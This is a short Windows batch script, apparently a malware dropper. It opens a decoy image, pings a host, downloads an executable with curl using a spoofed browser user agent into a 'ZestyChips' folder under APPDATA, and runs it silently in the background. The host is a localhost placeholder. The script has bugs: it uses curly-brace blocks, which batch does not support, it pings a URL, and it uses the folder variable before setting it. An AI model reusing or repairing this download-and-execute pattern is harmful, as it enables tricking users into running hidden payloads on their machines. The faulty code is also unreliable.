@echo off
setlocal

:: open the decoy
start "" "./bird2.jpg.png"

:: ping the host to see if its up, if not exit.
ping -n 1 http://localhost/ > nul
if %errorlevel% neq 0 {
    exit /b
}

:: useragent
set UserAgent=Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

:: download the file to APPDATA
curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php

:: check if error connecting
if %errorlevel% neq 0 {
    exit /b
}

:: create folder in APPDATA
set ZestyChipsFolder=%APPDATA%\ZestyChips
mkdir "%ZestyChipsFolder%"

:: check file exists (i.e. successful download) if not exit
if not exist "%ZestyChipsFolder%\ZestyChipsFromURL.exe" {
    exit /b
}

:: execute in background
start /b "" "%ZestyChipsFolder%\ZestyChipsFromURL.exe"

endlocal